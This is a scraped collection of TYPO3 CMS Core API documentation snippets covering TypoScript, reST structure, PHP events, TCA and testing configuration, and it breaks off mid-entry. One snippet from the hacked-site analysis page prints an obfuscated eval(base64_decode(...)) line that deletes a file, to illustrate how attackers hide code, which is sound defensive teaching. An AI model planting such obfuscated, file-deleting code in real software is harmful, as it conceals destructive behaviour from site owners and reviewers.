https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_5\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.myCounter = IMAGE\nlib.myCounter {\n  file = GIFBUILDER\n  file {\n     10 = TEXT\n     10.text.current = 1\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Table of Contents for TYPO3 Core Imaging Events\nDESCRIPTION: Sets up a table of contents for TYPO3 Core Imaging events documentation using reStructuredText directives. It includes all files in the current directory and displays only their titles.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Imaging/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Setting up LinkBrowser Tutorial Navigation Structure in reST\nDESCRIPTION: This snippet defines the structure of the LinkBrowser tutorials documentation using reStructuredText directives. It includes the main index tag for SearchEngine indexing, sets up the document title, and creates a table of contents for the sub-pages.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reST\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index:: LinkBrowser; Tutorials\n.. _LinkBrowserTutorials:\n\n=====================\nLinkBrowser Tutorials\n=====================\n\n**Contents:**\n\n..  rst-class:: compact-list\n..  toctree::\n    :titlesonly:\n\n    RecordLinkBrowser\n    CustomLinkBrowser\n```\n\n----------------------------------------\n\nTITLE: Function Naming in PHP\nDESCRIPTION: Demonstrates the convention for PHP function and method naming in TYPO3, emphasizing the use of verbs in names.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nprotected function getFeedbackForm()\npublic function processSubmission()\n```\n\n----------------------------------------\n\nTITLE: Applying Patches with Composer Install\nDESCRIPTION: Command to apply previously configured patches by running composer install. This applies all patches defined in the composer.json configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ncomposer install\n```\n\n----------------------------------------\n\nTITLE: Executing Obfuscated PHP Code Using eval() and base64_decode()\nDESCRIPTION: This snippet demonstrates how attackers may hide malicious code using base64 encoding. The encoded string contains a PHP command to delete a file named 'test.php'. This example illustrates the need for careful inspection of seemingly innocuous code.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/HackedSite/Analyze.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\neval(base64_decode('dW5saW5rKCd0ZXN0LnBocCcpOw=='));\n```\n\n----------------------------------------\n\nTITLE: Fluid Template Location for Page Layouts (HTML)\nDESCRIPTION: Illustrates the typical location for Fluid templates defining page layouts within a site package using the `PAGEVIEW` TypoScript object. These templates are generally found in `/Resources/Private/PageView/Pages/`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/PageView/Pages/MyPageLayout.html\"\n```\n\n----------------------------------------\n\nTITLE: Using AsEventListener PHP Attribute in TYPO3 CMS\nDESCRIPTION: The PHP attribute \\TYPO3\\CMS\\Core\\Attribute\\AsEventListener is used to tag a PHP class as an event listener in TYPO3 CMS version 13.0 and above. This provides an alternative to registering event listeners via the Configuration/Services.yaml file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/_includes/EventsAttributeAdded.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Attribute\\AsEventListener\n```\n\n----------------------------------------\n\nTITLE: Checking Property Existence in TYPO3 ModuleData\nDESCRIPTION: This method checks if a specific property exists in the module data. It returns a boolean value indicating the presence of the property.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: has(string $propertyName)\n        :returns: `bool`\n\n        :param $propertyName: the propertyName\n```\n\n----------------------------------------\n\nTITLE: Gitignore Configuration for Enetcache Extension\nDESCRIPTION: Git ignore file to exclude build artifacts, IDE-specific files, and runtime testing configurations\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_3\n\nLANGUAGE: none\nCODE:\n```\n.Build/\n.idea/\nBuild/testing-docker/.env\ncomposer.lock\n```\n\n----------------------------------------\n\nTITLE: Configuring TCA for TYPO3 Blog Example Info Model\nDESCRIPTION: Defines the complete TCA configuration for a blog info model including control section, columns definition, types configuration for backend forms, and language palette settings. Includes fields for name, bodytext, and various system fields for versioning and translation support.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Persistence/TCA.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    'ctrl' => [\n        'title' => 'LLL:EXT:blog_example/Resources/Private/Language/locallang_db.xlf:tx_blogexample_domain_model_info',\n        'label' => 'name',\n        'tstamp' => 'tstamp',\n        'crdate' => 'crdate',\n        'versioningWS' => true,\n        'transOrigPointerField' => 'l10n_parent',\n        'transOrigDiffSourceField' => 'l10n_diffsource',\n        'languageField' => 'sys_language_uid',\n        'translationSource' => 'l10n_source',\n        'origUid' => 't3_origuid',\n        'delete' => 'deleted',\n        'sortby' => 'sorting',\n        'enablecolumns' => [\n            'disabled' => 'hidden',\n        ],\n        'iconfile' => 'EXT:blog_example/Resources/Public/Icons/icon_tx_blogexample_domain_model_tag.gif',\n    ],\n    'columns' => [\n        'name' => [\n            'label' => 'LLL:EXT:blog_example/Resources/Private/Language/locallang_db.xlf:tx_blogexample_domain_model_info.name',\n            'config' => [\n                'type' => 'input',\n                'size' => 20,\n                'eval' => 'trim',\n                'required' => true,\n                'max' => 256,\n            ],\n        ],\n        'bodytext' => [\n            'label' => 'LLL:EXT:blog_example/Resources/Private/Language/locallang_db.xlf:tx_blogexample_domain_model_info.bodytext',\n            'config' => [\n                'type' => 'text',\n                'enableRichtext' => true,\n            ],\n        ],\n        'post' => [\n            'config' => [\n                'type' => 'passthrough',\n            ],\n        ],\n    ],\n    'types' => [\n        0 => ['showitem' => '\n                --div--;LLL:EXT:core/Resources/Private/Language/Form/locallang_tabs.xlf:general,\n                    name, bodytext,\n                --div--;LLL:EXT:core/Resources/Private/Language/Form/locallang_tabs.xlf:access,\n                    hidden,\n                --div--;LLL:EXT:core/Resources/Private/Language/Form/locallang_tabs.xlf:language,\n                    --palette--;;paletteLanguage,\n                --div--;LLL:EXT:core/Resources/Private/Language/Form/locallang_tabs.xlf:extended,\n        '],\n    ],\n    'palettes' => [\n        'paletteLanguage' => [\n            'showitem' => 'sys_language_uid, l10n_parent',\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Static Function Declaration in PHP\nDESCRIPTION: Illustrates the correct syntax for declaring a static function with visibility modifier\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_24\n\nLANGUAGE: php\nCODE:\n```\npublic static function executeAction(MyAction &$action, array $extraParameters)\n{\n    // Do something\n}\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure\nDESCRIPTION: ReStructuredText markup defining the documentation structure for the tea extension tutorial, including navigation, indexing, and section organization.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n\n..  index::\n    Extbase; Tea\n    Tutorial; Tea\n    Tutorial Tea\n..  _extbase_tutorial_tea:\n\n=================\nTea in a nutshell\n=================\n\n..  toctree::\n    :titlesonly:\n\n    ExtensionConfiguration\n    DirectoryStructure\n    Model\n    Repository\n    Controller\n```\n\n----------------------------------------\n\nTITLE: RST Section Headers\nDESCRIPTION: Defines document structure with main and subsection headers\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/Database.rst#2025-04-16_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n========\nDatabase\n========\n\nMySQL\n=====\n\n.. _troubleshooting-character-sets:\n\nCharacter Set\n-------------\n```\n\n----------------------------------------\n\nTITLE: Kickstarting a TYPO3 Extension in Legacy setup\nDESCRIPTION: Command to start the extension creation wizard in a legacy TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Kickstart/Make/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 make:extension\n```\n\n----------------------------------------\n\nTITLE: PHP Global Variable Usage\nDESCRIPTION: An example of how to properly use global variables in PHP, allowing uppercase and underscores.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']\n```\n\n----------------------------------------\n\nTITLE: Configuring Backend Login in YAML for TYPO3 Acceptance Tests\nDESCRIPTION: YAML configuration for loading and configuring the backend login module in a TYPO3 acceptance test suite file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/AcceptanceTesting/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmodules:\n  config:\n    - \\TYPO3\\TestingFramework\\Core\\Acceptance\\Helper\\Login:\n        sessions:\n          editor: 84dea7ebc40c23b07cb6f2ec3c22ad26\n          admin: 886526ce72b86870739cc41991144ec1\n```\n\n----------------------------------------\n\nTITLE: Translation with Ordered Arguments\nDESCRIPTION: Example of translation using ordered arguments for different language structures\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_7\n\nLANGUAGE: XML\nCODE:\n```\n<trans-unit id=\"blog.author\" xml:space=\"preserve\" approved=\"yes\">\n   <source>%1$s %2$s</source>\n   <target>%2$s%1$s</target>\n</trans-unit>\n```\n\nLANGUAGE: HTML\nCODE:\n```\n<f:translate\n   key=\"author\"\n   arguments=\"{1: blog.author.firstName, 2: blog.author.lastname}\"\n/>\n```\n\n----------------------------------------\n\nTITLE: PHP Disable Functions Configuration\nDESCRIPTION: Configuration for specifying allowed PHP disabled functions in TYPO3 environment checks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['allowedPhpDisableFunctions']\n    = ['set_time_limit', 'set_file_buffer'];\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterPageTreeItemsPreparedEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement a listener for the AfterPageTreeItemsPreparedEvent in TYPO3 CMS. It shows how to modify page tree items, add labels, and set status information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterPageTreeItemsPreparedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Controller\\Event\\AfterPageTreeItemsPreparedEvent;\nuse TYPO3\\CMS\\Core\\Imaging\\Icon;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterPageTreeItemsPreparedEvent $event): void\n    {\n        $items = $event->getItems();\n\n        foreach ($items as $item) {\n            $pageUid = $item['_page']['uid'];\n\n            // Add a label\n            $item->addLabel(\n                text: 'Important',\n                class: 'my-label-class',\n                iconIdentifier: 'my-icon-identifier',\n                priority: 10\n            );\n\n            // Add status information\n            $item->addStatusInformation(\n                status: 'important',\n                label: 'Important information',\n                icon: Icon::SIZE_SMALL,\n                iconIdentifier: 'my-icon-identifier',\n                severity: 1\n            );\n\n            // Modify other properties\n            $item['cls'] = 'my-custom-class';\n        }\n\n        $event->setItems($items);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Advanced Backend Layout with Multiple Columns in TYPO3\nDESCRIPTION: Advanced example of a 3x3 backend layout with 5 column positions including a header spanning all columns and an aside spanning two rows, demonstrating more complex layout configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendLayout.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nmod.web_layout.BackendLayouts {\n  exampleKey {\n    title = Example\n    icon = EXT:example_extension/Resources/Public/Images/BackendLayouts/default.gif\n    config {\n      backend_layout {\n        colCount = 3\n        rowCount = 3\n        rows {\n          1 {\n            columns {\n              1 {\n                identifier = header\n                name = Header\n                colspan = 3\n                colPos = 1\n              }\n            }\n          }\n          2 {\n            columns {\n              1 {\n                identifier = main\n                name = Main\n                colspan = 2\n                colPos = 0\n              }\n              2 {\n                identifier = aside\n                name = Aside\n                rowspan = 2\n                colPos = 2\n              }\n            }\n          }\n          3 {\n            columns {\n              1 {\n                identifier = left\n                name = Main Left\n                colPos = 5\n              }\n              2 {\n                identifier = right\n                name = Main Right\n                colPos = 6\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: String Handling in PHP\nDESCRIPTION: Guidelines for string handling in PHP, emphasizing single quotes for strings and space usage around concatenation operators.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_18\n\nLANGUAGE: php\nCODE:\n```\n$content = 'Hello ' . 'world!';\n$content = 'Hello ' . $userName;\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Import Help Command\nDESCRIPTION: Command to display complete list of import options and help information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateContent/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 help impexp:import\n```\n\n----------------------------------------\n\nTITLE: Basic Fluid Comment ViewHelper Usage\nDESCRIPTION: Demonstrates how to use the Fluid Comment ViewHelper to exclude content from template rendering. The commented content will not appear in the final rendered output.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_24\n\nLANGUAGE: html\nCODE:\n```\n<f:comment>\n    This will be ignored by the Fluid parser and will not appear in\n    the source code of the rendered template\n</f:comment>\n```\n\n----------------------------------------\n\nTITLE: Registering a custom LinkHandler via page TSconfig in TYPO3\nDESCRIPTION: TSconfig configuration that registers a custom GitHub LinkHandler in TYPO3's LinkBrowser. It defines the handler class, its label, and JavaScript module to be used.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/CustomLinkHandlers.rst#2025-04-16_snippet_1\n\nLANGUAGE: tsconfig\nCODE:\n```\nTCEMAIN.linkHandler.github {\n    handler = T3docs\\Examples\\LinkHandler\\GitHubLinkHandler\n    label = GitHub Link\n    displayAfter = url\n    scanAfter = url\n    configuration {\n        // Add custom configuration options here,\n        // passed to the LinkHandler constructor later on\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyInlineElementControlsEvent Class in PHP for TYPO3 CMS Backend Form\nDESCRIPTION: This code snippet defines the ModifyInlineElementControlsEvent class in the TYPO3\\CMS\\Backend\\Form\\Event namespace. It includes methods for manipulating inline element controls and accessing related data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyInlineElementControlsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Backend\\Form\\Event;\n\nclass ModifyInlineElementControlsEvent\n{\n    public function getControls(): array\n    {\n        // Returns all controls with their markup\n    }\n\n    public function setControls(array $controls): void\n    {\n        // Overwrite the controls\n    }\n\n    public function getControl(string $identifier): string\n    {\n        // Returns the markup for the requested control\n    }\n\n    public function setControl(string $identifier, string $markup): void\n    {\n        // Set a control with the given identifier and markup\n        // IMPORTANT: Overwrites an existing control with the same identifier\n    }\n\n    public function hasControl(string $identifier): bool\n    {\n        // Returns whether a control exists for the given identifier\n    }\n\n    public function removeControl(string $identifier): bool\n    {\n        // Removes a control from the inline element, if it exists\n        // Returns whether the control could be removed\n    }\n\n    public function getElementData(): array\n    {\n        // Returns the whole element data\n    }\n\n    public function getRecord(): array\n    {\n        // Returns the current record of the controls are created for\n    }\n\n    public function getParentUid(): string\n    {\n        // Returns the uid of the parent (embedding) record (uid or NEW...)\n    }\n\n    public function getForeignTable(): string\n    {\n        // Returns the table (foreign_table) the controls are created for\n    }\n\n    public function getFieldConfiguration(): array\n    {\n        // Returns the TCA configuration of the inline record field\n    }\n\n    public function isVirtual(): bool\n    {\n        // Returns whether the current records is only virtually shown and not physically part of the parent record\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Table of Contents Directory\nDESCRIPTION: RST directive for creating a table of contents from glob-matched files in the current directory\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Workspaces/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for Debug Settings Screenshot\nDESCRIPTION: ReStructuredText directive for including and configuring a screenshot of the TYPO3 debug presets interface with proper alt text and styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/DebugSettings/DebugSettings.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/DebugSettings/DebugSettings.png\n   :alt: Debug Presets\n   :class: with-shadow\n\n   Choose the debug preset\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Page Content with Conditional Logic in TypoScript\nDESCRIPTION: This TypoScript snippet defines page content with conditional logic. It checks if a front-end user is logged in or if the client IP matches 127.0.0.1. If conditions are true, a different text is displayed in uppercase. Dependencies include a TYPO3 environment and proper TypoScript setup. Input conditions include user login status and IP address, outputting tailored text responses.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/Conditions3.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\npage = PAGE\npage.10 = TEXT\npage.10.value = HELLO WORLD!\n\n[frontend.user.isLoggedIn || ip('127.0.0.1')]\n   page.20 = TEXT\n   page.20 {\n      value = A frontend user is logged in, or the browser IP is 127.0.0.1\n      stdWrap.case = upper\n   }\n[GLOBAL]\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Locales Class Definition\nDESCRIPTION: Reference to the PHP class that defines supported languages in TYPO3 CMS core system. This class contains the master list of all supported language configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/Languages.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Localization\\Locales::$languages\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFormEnginePageInitializedEvent Class Methods in TYPO3\nDESCRIPTION: Defines the AfterFormEnginePageInitializedEvent class with two getter methods - getController() which returns EditDocumentController instance and getRequest() which returns ServerRequestInterface instance. This event is triggered after the form engine initialization is complete.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/AfterFormEnginePageInitializedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass AfterFormEnginePageInitializedEvent {\n    public function getController(): \\TYPO3\\CMS\\Backend\\Controller\\EditDocumentController\n    {\n        // Implementation details not shown\n    }\n\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Implementation details not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Sitepackage Composer Configuration\nDESCRIPTION: composer.json configuration for a TYPO3 sitepackage extension, defining PSR-4 autoloading.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_9\n\nLANGUAGE: json\nCODE:\n```\n{\n     \"autoload\": {\n         \"psr-4\": {\n             \"MyVendor\\\\Sitepackage\\\\\": \"Classes/\"\n         }\n     }\n}\n```\n\n----------------------------------------\n\nTITLE: Embedding Image with Caption in reStructuredText\nDESCRIPTION: This reStructuredText snippet demonstrates how to include an image in a document with a caption and a CSS class. The `:figure:` directive is used to create a figure environment, and the `:class:` option applies a CSS class for styling. The image path is specified, and the caption provides a brief description of the image.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Introduction/ExtensionsMinimalList.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Introduction/ExtensionsMinimalList.png\n   :class: with-shadow\n\n   Screenshot of the backend showing the :guilabel:`Extensions` module\n```\n\n----------------------------------------\n\nTITLE: ModifyAutoCreateRedirectRecordBeforePersistingEvent Class Methods\nDESCRIPTION: Defines the core methods of the ModifyAutoCreateRedirectRecordBeforePersistingEvent class in TYPO3 CMS. These methods allow retrieving and modifying redirect records before they are persisted to the database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Redirects/ModifyAutoCreateRedirectRecordBeforePersistingEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getSlugRedirectChangeItem()\n:returns: `\\TYPO3\\CMS\\Redirects\\RedirectUpdate\\SlugRedirectChangeItem`\n```\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getSource()\n:returns: `\\TYPO3\\CMS\\Redirects\\RedirectUpdate\\RedirectSourceInterface`\n```\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getRedirectRecord()\n:returns: `array`\n```\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: setRedirectRecord(array $redirectRecord)\n:param $redirectRecord: the redirectRecord\n```\n\n----------------------------------------\n\nTITLE: Defining Hidden Table of Contents in reStructuredText for TYPO3 Upgrade Documentation\nDESCRIPTION: This code snippet defines a hidden table of contents in reStructuredText for various TYPO3 upgrade topics. It includes links to separate documentation files for each upgrade topic.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :hidden:\n\n    Minor/Index\n    Major/Index\n    UpgradingExtensions/Index\n    Tools/Index\n    Legacy/Index\n    ApplyingCorePatches/Index\n    MigrateToComposer/Index\n    MigrateContent/Index\n```\n\n----------------------------------------\n\nTITLE: Retrieving Identifier in AfterFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the initialized data structure identifier, which has either been defined by an event listener or set to the default by the FlexFormTools component.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_6\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getIdentifier()\n    :returns: `array`\n```\n\n----------------------------------------\n\nTITLE: Implementing PageTree Helper for TYPO3 Acceptance Tests\nDESCRIPTION: PHP code demonstrating how to implement a PageTree helper class for TYPO3 acceptance tests.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/AcceptanceTesting/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\TestingFramework\\Core\\Acceptance\\Support\\Helper;\n\nuse Facebook\\WebDriver\\Remote\\RemoteWebElement;\nuse TYPO3\\TestingFramework\\Core\\Acceptance\\Step\\Backend\\Admin;\n\nclass PageTree extends Admin implements PageTreeInterface\n{\n    public function getPageXpath(string $pageName, int $level = 1): string\n    {\n        return '//*[contains(@class, \"treelist-wrapper\")]'\n            . '//*[contains(@class, \"treelist-collapse-wrapper\")]'\n            . '/ol[2]/li[contains(@class, \"treelist-level-' . $level . '\")]'\n            . '/div/span[contains(text(), \"' . $pageName . '\")]';\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Authentication Services Screenshot in reST Documentation\nDESCRIPTION: reST directive for including a screenshot of TYPO3's authentication services configuration with proper formatting and caption.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Authentication/InstalledAuthServices.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. =========================================================\n.. Automatically generated by the TYPO3 Screenshots project.\n.. https://github.com/TYPO3-Documentation/t3docs-screenshots\n.. =========================================================\n\n.. figure:: /Images/AutomaticScreenshots/Authentication/InstalledAuthServices.png\n   :class: with-shadow\n\n   All installed authentication services and their priority\n```\n\n----------------------------------------\n\nTITLE: PHP Asset Path Resolution\nDESCRIPTION: PHP code example showing how to resolve absolute web paths for extension assets using TYPO3 utility methods\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/AssetMigration.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nPathUtility::getAbsoluteWebPath(GeneralUtility::getFileAbsFileName('EXT:my-extension/Resources/Public/logo.jpg')\n```\n\n----------------------------------------\n\nTITLE: Multi-site Project Backend Groups Extended Structure\nDESCRIPTION: PlantUML diagram showing additional backend group structures for a multi-site TYPO3 project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/PermissionsManagement/ExampleConfiguration/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: plantuml\nCODE:\n```\n..  uml:: _backend-groups-multisite-project-2.plantuml\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Package Checksums\nDESCRIPTION: Sample checksums for TYPO3 v12.4.11 release packages including SHA256, SHA1, and MD5 hashes for verification.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/ReleaseIntegrity.rst#2025-04-16_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nSHA256:\na93bb3e8ceae5f00c77f985438dd948d2a33426ccfd7c2e0e5706325c43533a3  typo3_src-12.4.11.tar.gz\n8e0a8eaeed082e273289f3e17318817418c38c295833a12e7f94abb2845830ee  typo3_src-12.4.11.zip\n\nSHA1:\n9fcecf7b0e72074b060516c22115d57dd29fd5b0  typo3_src-12.4.11.tar.gz\n3606bcc9331f2875812ddafd89ccc2ddf8922b63  typo3_src-12.4.11.zip\n\nMD5:\na4fbb1da81411f350081872fe2ff2dac  typo3_src-12.4.11.tar.gz\nc514ef9b7aad7c476fa4f36703e686fb  typo3_src-12.4.11.zip\n```\n\n----------------------------------------\n\nTITLE: Setting Validator Options in TYPO3 PHP\nDESCRIPTION: Method for configuring validator options provided by the framework. Accepts an array of options to customize validator behavior.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Api/ValidatorInterface.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nsetOptions(array $options)\n```\n\n----------------------------------------\n\nTITLE: TYPO3 System Log Table Reference\nDESCRIPTION: SQL table reference for the TYPO3 system log where DataHandler operations are recorded.\nSOURCE: 